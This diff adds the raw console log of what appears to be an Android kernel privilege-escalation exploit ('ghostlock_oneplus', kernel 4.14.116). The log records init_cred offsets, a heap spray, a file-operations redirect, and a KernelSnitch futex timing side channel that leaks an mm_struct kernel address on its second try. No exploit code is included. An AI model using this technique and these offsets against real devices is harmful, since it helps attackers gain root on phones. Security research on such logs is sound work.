@@ -1,0 +1,251 @@
+[*] kernel: 4.14.116
+[+] offsets matched: 4.14.116
+[*] init_cred image=ffffff800aebc9a8 alias=ffffffff82ebc9a8
+[+] startup context pid=7522 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=7522 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[+] build config pid=7522 label=ghostlock_oneplus slide=pselect main=pselect
+[+] p0 profile pid=7522 phys_offset=0000000080000000 kernel_phys_load=0000000000080000 delta=ffffffff80080000 slide_logger=ffffff802a4021a0 bootid_data=ffffff802a6aa868 init_task=ffffff802a40cf00 root_tg=ffffff802a63d580 sysctl_bootid=ffffff802a6aa868
+[*] p0 kernel_phys_load=0000000000080000 phys_offset=0000000080000000 delta=ffffffff80080000
+[*] [T+0ms] exploit start
+[*] UMH path: fops redirect (mode=4)...
+[*] [T+1623ms] pre-UMH drain
+[*] === fops redirect === target=0xffffffff8303e378 mode=4
+[*] [T+1624ms]   heap spray start
+[*] KernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[*] KernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[*] start finding collisisons
+[*] target    0000007dba8be0c8
+[*] pass1 slow candidates: 941
+[*]   0000006dba03ed60 t1=65 t2=1562
+[*]   0000006dba12e4e0 t1=195 t2=1496
+[*]   0000006dba180770 t1=520 t2=1562
+[*]   0000006dba355618 t1=835872 t2=781
+[*]   0000006dba372700 t1=130 t2=1366
+[*]   0000006dba806ba0 t1=325 t2=1562
+[*]   0000006dbaa8dfd8 t1=260 t2=1562
+[*]   0000006dbaa99038 t1=390 t2=1562
+[*]   0000006dbab75718 t1=520 t2=1562
+[*]   0000006dbac59e38 t1=260 t2=1562
+[*]   0000006dbacba140 t1=65 t2=1562
+[*]   0000006dbb050df0 t1=455 t2=1366
+[*]   0000006dbb0fa340 t1=520 t2=1562
+[*]   0000006dbb50b3c8 t1=130 t2=1562
+[*]   0000006dbb52f4e8 t1=260 t2=1562
+[*]   0000006dbb5e7aa8 t1=520 t2=1562
+[*]   0000006dbb7907f0 t1=835351 t2=520
+[*]   0000006dbb851df8 t1=520 t2=1562
+[*]   0000006dbb9feb60 t1=195 t2=1301
+[*]   0000006dbbb0f3e8 t1=835221 t2=521
+[*]   0000006dbbb73708 t1=325 t2=1562
+[*]   0000006dbbba98b8 t1=325 t2=520
+[*]   0000006dbbc50df0 t1=260 t2=520
+[*]   0000006dbbcba140 t1=520 t2=520
+[*]   0000006dbbf1c450 t1=130 t2=520
+[*]   0000006dbc0a90b8 t1=455 t2=520
+[*]   0000006dbc0cd1d8 t1=520 t2=520
+[*]   0000006dbc153608 t1=65 t2=520
+[*]   0000006dbc158630 t1=65 t2=520
+[*]   0000006dbc17c750 t1=520 t2=520
+[*]   0000006dbc18f7e8 t1=130 t2=520
+[*]   0000006dbc4b4110 t1=520 t2=520
+[*]   0000006dbc58e7e0 t1=325 t2=520
+[*]   0000006dbc93b548 t1=325 t2=0
+[*]   0000006dbca07ba8 t1=130 t2=520
+[*]   0000006dbcd304f0 t1=520 t2=520
+[*]   0000006dbcebb148 t1=195 t2=455
+[*]   0000006dbcfb4910 t1=195 t2=520
+[*]   0000006dbd18c7d0 t1=130 t2=520
+[*]   0000006dbd279f38 t1=520 t2=520
+[*]   0000006dbd48afc0 t1=130 t2=520
+[*]   0000006dbd71c450 t1=836067 t2=0
+[*]   0000006dbd745598 t1=260 t2=0
+[*]   0000006dbd7be960 t1=834895 t2=0
+[*]   0000006dbd8ef2e8 t1=260 t2=520
+[*]   0000006dbdab3108 t1=130 t2=520
+[*]   0000006dbdadc250 t1=260 t2=520
+[*]   0000006dbdb81778 t1=65 t2=520
+[*]   0000006dbdbb18f8 t1=835091 t2=0
+[*]   0000006dbde9b048 t1=520 t2=520
+[*]   0000006dbdeb2100 t1=835872 t2=0
+[*]   0000006dbdf686b0 t1=325 t2=520
+[*]   0000006dbe3a4890 t1=195 t2=520
+[*]   0000006dbe4a3088 t1=520 t2=520
+[*]   0000006dbe5063a0 t1=130 t2=520
+[*]   0000006dbe585798 t1=65 t2=520
+[*]   0000006dbe5a78a8 t1=520 t2=520
+[*]   0000006dbe8d5218 t1=325 t2=520
+[*]   0000006dbeac91b8 t1=195 t2=520
+[*]   0000006dbecca1c0 t1=260 t2=520
+[*]   0000006dbed78730 t1=834309 t2=0
+[*]   0000006dbee28cb0 t1=835286 t2=0
+[*]   0000006dbee78f30 t1=65 t2=0
+[*]   0000006dbefb6920 t1=455 t2=520
+[*]   0000006dbf1d8a30 t1=65 t2=520
+[*]   0000006dbf26aec0 t1=520 t2=520
+[*]   0000006dbf315418 t1=520 t2=520
+[*]   0000006dbf8d3208 t1=65 t2=520
+[*]   0000006dbf9c1978 t1=195 t2=520
+[*]   0000006dbfaea2c0 t1=520 t2=520
+[*]   0000006dbfbb6920 t1=455 t2=520
+[*]   0000006dbfbe5a98 t1=455 t2=520
+[*]   0000006dbfc0cbd0 t1=195 t2=520
+[*]   0000006dbfc12c00 t1=325 t2=520
+[*]   0000006dbfc33d08 t1=260 t2=520
+[*]   0000006dbfd15418 t1=835481 t2=0
+[*]   0000006dbfdfeb60 t1=520 t2=520
+[*]   0000006dbfff8b30 t1=130 t2=0
+[*]   0000006dc00fd358 t1=325 t2=0
+[*] found 15 collisisons
+[*] KernelSnitch collisions: found
+[*] start bruteforcing
+[*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[*] done
+[-] prepare_kernel_page retry 1/24
+[*] KernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[*] KernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[*] start finding collisisons
+[*] target    0000007dba8be0c8
+[*] pass1 slow candidates: 989
+[*]   0000006db9f7d758 t1=390 t2=1562
+[*]   0000006dba36c6d0 t1=520 t2=1562
+[*]   0000006dba463e88 t1=816406 t2=1041
+[*]   0000006dba46fee8 t1=520 t2=1562
+[*]   0000006dba4d7228 t1=390 t2=1562
+[*]   0000006dba664e90 t1=455 t2=1562
+[*]   0000006dba6a5098 t1=325 t2=1497
+[*]   0000006dba7a88b0 t1=520 t2=1497
+[*]   0000006dbaabd158 t1=325 t2=1562
+[*]   0000006dbab1c450 t1=260 t2=1562
+[*]   0000006dbaba2880 t1=836588 t2=1041
+[*]   0000006dbac5be48 t1=455 t2=1367
+[*]   0000006dbacb2100 t1=520 t2=1562
+[*]   0000006dbad34510 t1=836067 t2=1041
+[*]   0000006dbaed01f0 t1=520 t2=1562
+[*]   0000006dbafebac8 t1=520 t2=1496
+[*]   0000006dbaff7b28 t1=390 t2=1432
+[*]   0000006dbb08afc0 t1=835937 t2=1041
+[*]   0000006dbb208bb0 t1=325 t2=1562
+[*]   0000006dbb3f9b38 t1=325 t2=1562
+[*]   0000006dbb689fb8 t1=836197 t2=1041
+[*]   0000006dbb7907f0 t1=325 t2=1562
+[*]   0000006dbb7bc950 t1=130 t2=1497
+[*]   0000006dbb83ad40 t1=260 t2=1431
+[*]   0000006dbba65e98 t1=520 t2=1562
+[*]   0000006dbbade260 t1=520 t2=1562
+[*]   0000006dbbc0abc0 t1=520 t2=520
+[*]   0000006dbbdb6920 t1=520 t2=520
+[*]   0000006dbbddca50 t1=325 t2=520
+[*]   0000006dbbe64e90 t1=520 t2=520
+[*]   0000006dbbe6ded8 t1=260 t2=520
+[*]   0000006dbbeb4110 t1=195 t2=520
+[*]   0000006dbc36d6d8 t1=325 t2=520
+[*]   0000006dbc3c5998 t1=836718 t2=520
+[*]   0000006dbc442d80 t1=325 t2=520
+[*]   0000006dbc6c61a0 t1=195 t2=520
+[*]   0000006dbca13c08 t1=325 t2=520
+[*]   0000006dbcadb248 t1=260 t2=520
+[*]   0000006dbcaf9338 t1=455 t2=520
+[*]   0000006dbcda3888 t1=520 t2=520
+[*]   0000006dbd07ef60 t1=520 t2=520
+[*]   0000006dbd132500 t1=390 t2=520
+[*]   0000006dbd1d2a00 t1=195 t2=520
+[*]   0000006dbd20fbe8 t1=390 t2=520
+[*]   0000006dbd4d3208 t1=520 t2=520
+[*]   0000006dbd518430 t1=827929 t2=455
+[*]   0000006dbd604b90 t1=390 t2=520
+[*]   0000006dbd70c3d0 t1=65 t2=520
+[*]   0000006dbd793808 t1=130 t2=520
+[*]   0000006dbd800b70 t1=390 t2=520
+[*]   0000006dbd830cf0 t1=390 t2=520
+[*]   0000006dbdacd1d8 t1=455 t2=520
+[*]   0000006dbdbffb68 t1=65 t2=520
+[*]   0000006dbdcd4210 t1=520 t2=520
+[*]   0000006dbdcd8230 t1=818359 t2=325
+[*]   0000006dbdd72700 t1=260 t2=520
+[*]   0000006dbdde4a90 t1=520 t2=520
+[*]   0000006dbdefa340 t1=455 t2=520
+[*]   0000006dbdf686b0 t1=817252 t2=455
+[*]   0000006dbe096020 t1=65 t2=520
+[*]   0000006dbe0ba140 t1=130 t2=520
+[*]   0000006dbe42fce8 t1=390 t2=520
+[*]   0000006dbe466ea0 t1=260 t2=520
+[*]   0000006dbe4f3308 t1=819792 t2=325
+[*]   0000006dbe51f468 t1=325 t2=520
+[*]   0000006dbe5ce9e0 t1=819661 t2=195
+[*]   0000006dbe5e4a90 t1=325 t2=520
+[*]   0000006dbe6f7328 t1=65 t2=520
+[*]   0000006dbe78e7e0 t1=520 t2=520
+[*]   0000006dbe835d18 t1=520 t2=520
+[*]   0000006dbe83dd58 t1=390 t2=520
+[*]   0000006dbe9f3b08 t1=325 t2=520
+[*]   0000006dbeb1d458 t1=520 t2=520
+[*]   0000006dbec66ea0 t1=325 t2=520
+[*]   0000006dbecb3108 t1=260 t2=520
+[*]   0000006dbecb5118 t1=520 t2=520
+[*]   0000006dbee19c38 t1=260 t2=520
+[*]   0000006dbeecd1d8 t1=65 t2=520
+[*]   0000006dbf2bd158 t1=195 t2=520
+[*]   0000006dbf2f4310 t1=520 t2=520
+[*]   0000006dbf2ff368 t1=818945 t2=455
+[*]   0000006dbf478f30 t1=325 t2=520
+[*]   0000006dbf8e2280 t1=390 t2=520
+[*]   0000006dbf9a2880 t1=455 t2=520
+[*]   0000006dbfbe8ab0 t1=325 t2=520
+[*]   0000006dbfcb3108 t1=65 t2=520
+[*]   0000006dbff264a0 t1=520 t2=520
+[*]   0000006dbff93808 t1=325 t2=520
+[*]   0000006dc000ebe0 t1=260 t2=520
+[*]   0000006dc0143588 t1=455 t2=520
+[*]   0000006dc02bc150 t1=455 t2=520
+[*]   0000006dc02cd1d8 t1=455 t2=520
+[*]   0000006dc04d11f8 t1=130 t2=520
+[*]   0000006dc0502380 t1=455 t2=520
+[*]   0000006dc059f868 t1=260 t2=520
+[*]   0000006dc061cc50 t1=325 t2=520
+[*]   0000006dc07eeae0 t1=520 t2=520
+[*]   0000006dc0814c10 t1=130 t2=520
+[*]   0000006dc08c5198 t1=325 t2=520
+[*]   0000006dc093d558 t1=195 t2=520
+[*]   0000006dc0b0f3e8 t1=520 t2=520
+[*]   0000006dc0cd8230 t1=195 t2=520
+[*]   0000006dc0e85f98 t1=325 t2=520
+[*]   0000006dc0f686b0 t1=390 t2=520
+[*]   0000006dc0fa0870 t1=455 t2=520
+[*]   0000006dc0fa5898 t1=195 t2=520
+[*]   0000006dc11c99b8 t1=520 t2=520
+[*]   0000006dc1260e70 t1=818098 t2=325
+[*]   0000006dc1272f00 t1=65 t2=520
+[*]   0000006dc127ef60 t1=260 t2=520
+[*]   0000006dc14d6220 t1=455 t2=520
+[*]   0000006dc1575718 t1=390 t2=520
+[*]   0000006dc170d3d8 t1=818164 t2=260
+[*]   0000006dc182acc0 t1=455 t2=520
+[*]   0000006dc19ce9e0 t1=520 t2=520
+[*]   0000006dc1a71ef8 t1=260 t2=520
+[*]   0000006dc1c39d38 t1=195 t2=520
+[*]   0000006dc1c62e80 t1=390 t2=520
+[*]   0000006dc1c98030 t1=819401 t2=390
+[*] found 15 collisisons
+[*] KernelSnitch collisions: found
+[*] start bruteforcing
+[*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[*] KernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffff8194ad3480
+[*] done
